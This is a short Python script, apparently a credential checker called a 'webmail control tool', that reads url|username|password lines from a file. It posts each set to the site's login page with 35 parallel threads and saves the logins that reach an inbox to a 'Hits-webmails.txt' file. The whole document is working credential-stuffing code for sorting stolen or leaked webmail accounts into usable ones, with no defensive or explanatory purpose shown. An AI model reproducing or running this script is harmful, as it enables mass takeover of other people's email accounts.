import requests,sys,time
from concurrent.futures import ThreadPoolExecutor
from colorama import *
init(autoreset=True)

msg0 ="Welcome to the webmail control tool Coded By Hyper \n"
for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)

filename = input("Enter File: ")

def check_login(line):
    url, username, password = line.strip().split("|")
    session = requests.Session()
    try:
        response = session.post(f"{url}/login", data={"user": username, "pass": password}, timeout=5)
    except:
        print(Fore.RED + f"Connection error: {url}")
        return

    if "Inbox" in response.text:
        print(Fore.GREEN + f"Login successful: {url}")
        open("Hits-webmails.txt","a").write(url + "|"+ username + "|" + password + "\n")
    else:
        print(Fore.RED + f"Login failed: {url}")

with open(filename, "r") as f:
    lines = f.readlines()

with ThreadPoolExecutor(max_workers=35) as executor:
    executor.map(check_login, lines)